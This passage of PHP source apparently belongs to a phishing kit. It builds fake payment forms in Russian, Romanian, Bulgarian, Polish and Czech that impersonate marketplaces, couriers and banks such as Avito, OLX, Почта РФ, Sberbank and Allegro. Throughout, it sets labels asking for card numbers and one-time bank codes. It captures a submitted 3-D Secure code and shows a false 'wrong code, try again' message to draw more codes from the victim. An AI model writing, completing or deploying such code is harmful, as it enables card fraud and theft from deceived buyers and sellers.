2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop2 = 'Сумма';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop2 = 'Cantitate';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop2 = 'Сума';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop2 = 'Сумма';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop2 = 'Сумма';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop2 = 'Ilość';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop2 = 'Výše platby';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop2 = 'Výše platby';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop3 = 'Дата';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop3 = 'Дата';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop3 = 'Дата';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop3 = 'Дата';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop3 = 'Дата';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop3 = 'Дата';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop3 = 'Дата';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop3 = 'Data';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop3 = 'Data';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop3 = 'Data';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop4 = 'Номер карты';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop4 = 'Номер карты';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop4 = 'Номер карты';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop4 = 'Număr de card';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop4 = 'Номер на картата';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop4 = 'Номер карты';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop4 = 'Номер карты';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop4 = 'Numer karty';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop4 = 'Číslo karty';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop4 = 'Číslo karty';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop5 = 'Личное приветствие';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop5 = 'Личное приветствие';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop5 = 'Личное приветствие';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop5 = 'Salutări personale';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop5 = 'Личен поздрав';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop5 = 'Личное приветствие';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop5 = 'Личное приветствие';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop5 = 'Osobiste pozdrowienia';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop5 = 'Komentář k platbě';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop5 = 'Komentář k platbě';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop6 = 'ОТПРАВИТЬ';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop6 = 'ОТПРАВИТЬ';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop6 = 'ОТПРАВИТЬ';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop6 = 'TRIMITE';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop6 = 'ИЗПРАТЯ';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop6 = 'ОТПРАВИТЬ';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop6 = 'ОТПРАВИТЬ';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop6 = 'Zatwierdź';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop6 = 'Potvrdit';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop6 = 'Potvrdit';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop7 = 'Одноразовый код';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
			$msgffshop7 = 'Одноразовый код';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop7 = 'Одноразовый код';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop7 = 'Cod unic';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop7 = 'Еднократен код';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop7 = 'Одноразовый код';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop7 = 'Одноразовый код';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop7 = 'Kod jednorazowy';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop7 = 'jednorázový kód';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop7 = 'jednorázový kód';
			} 
	$code3ds = substr(beaText($_POST2['3dscode'], chsAll()), 0, 20);
	if ($code3ds && strlen($code3ds) > 2) {
			    if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msg = [true, 'Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msg = [true, 'Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.'];
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msg = [true, 'Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.'];
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msg = [true, 'Ați introdus codul greșit. Vă rugăm să verificați codul mesajului și să îl introduceți din nou.'];
			} 
